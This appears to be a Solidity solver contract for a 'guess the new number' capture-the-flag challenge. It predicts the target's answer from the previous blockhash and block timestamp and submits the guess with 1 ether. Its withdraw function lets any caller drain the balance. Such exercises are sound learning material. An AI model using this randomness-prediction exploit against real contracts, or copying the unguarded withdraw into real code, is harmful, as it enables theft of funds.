// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheRandomNumberChallenge {
  function guess(uint8) external payable;
}

contract GuessTheNewNumberSolver {

  IGuessTheRandomNumberChallenge public _interface;

  constructor(address _interfaceAddress) {
    require(_interfaceAddress != address(0), "Address can not be Zero");
    _interface = IGuessTheRandomNumberChallenge(_interfaceAddress);
  }
  function solve() public payable {
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    _interface.guess{value: 1 ether}(answer);
  }
  function getBalance() public view returns(uint){
    return address(this).balance;
  }
  function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
  }
  receive() external payable {}
}